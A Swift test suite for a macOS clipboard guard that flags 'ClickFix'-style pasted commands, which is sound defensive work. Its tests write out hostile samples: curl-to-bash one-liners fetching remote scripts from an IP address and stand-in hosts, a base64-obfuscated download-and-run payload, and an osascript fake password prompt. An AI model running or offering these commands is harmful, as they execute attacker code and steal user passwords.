import Foundation
import Testing
@testable import MacCleanerKit

/// Pure policy tests: no real pasteboard is read and no notification posted.
@Suite("ClickFix clipboard guard")
struct ClipboardGuardTests {
    private let text = ["public.utf8-plain-text"]

    @Test func clickFixOneLinerWarns() {
        let v = ClipboardThreatPolicy.evaluate(#"/bin/bash -c "$(curl -fsSL http://45.94.47.112/install.sh)""#)
        #expect(v?.rule == .remoteScriptToShell)
    }

    @Test func base64PayloadWarns() {
        let payload = Data("curl -s http://evil.example/x.sh | bash".utf8).base64EncodedString()
        let v = ClipboardThreatPolicy.evaluate("echo \(payload) | base64 -d | sh")
        #expect(v != nil)
    }

    @Test func fakePasswordPromptWarns() {
        let cmd = #"osascript -e 'display dialog "macOS needs your password" default answer "" with hidden answer'"#
        #expect(ClipboardThreatPolicy.evaluate(cmd)?.rules.contains(.fakePasswordPrompt) == true)
    }

    @Test func ordinaryTextAndCommandsDontWarn() {
        #expect(ClipboardThreatPolicy.evaluate("Ciao, ci vediamo domani alle 10") == nil)
        #expect(ClipboardThreatPolicy.evaluate("git status && ls -la") == nil)
        #expect(ClipboardThreatPolicy.evaluate("npm install --save-dev typescript") == nil)
        // Homebrew's official installer is graded medium: no warning.
        #expect(ClipboardThreatPolicy.evaluate(
            #"/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)""#) == nil)
    }

    @Test func concealedAndTransientItemsAreNeverRead() {
        var read = false
        let v = ClipboardThreatPolicy.verdict(types: text + ["org.nspasteboard.ConcealedType"], source: nil) {
            read = true; return "curl http://x.example/a | sh"
        }
        #expect(v == nil)
        #expect(read == false)
        #expect(!ClipboardThreatPolicy.shouldInspect(types: text + ["org.nspasteboard.TransientType"], source: nil))
    }

    @Test func passwordManagersAreSkipped() {
        #expect(!ClipboardThreatPolicy.shouldInspect(types: text, source: "com.1password.1password"))
        #expect(!ClipboardThreatPolicy.shouldInspect(types: text, source: "com.bitwarden.desktop"))
        #expect(ClipboardThreatPolicy.shouldInspect(types: text, source: "com.apple.Safari"))
    }

    @Test func nonTextIsSkipped() {
        #expect(!ClipboardThreatPolicy.shouldInspect(types: ["public.png"], source: nil))
    }

    @Test func oversizedOrTinyTextIsSkipped() {
        #expect(!ClipboardThreatPolicy.looksLikeCommand("sh"))
        let huge = String(repeating: "curl x | sh ", count: 10_000)
        #expect(!ClipboardThreatPolicy.looksLikeCommand(huge))
    }

    @Test func enabledByDefault() {
        let defaults = UserDefaults(suiteName: "w3-clipboard-test-\(UUID().uuidString)")!
        #expect(ClipboardThreatPolicy.isEnabled(defaults))
        defaults.set(false, forKey: ClipboardThreatPolicy.enabledKey)
        #expect(!ClipboardThreatPolicy.isEnabled(defaults))
    }
}
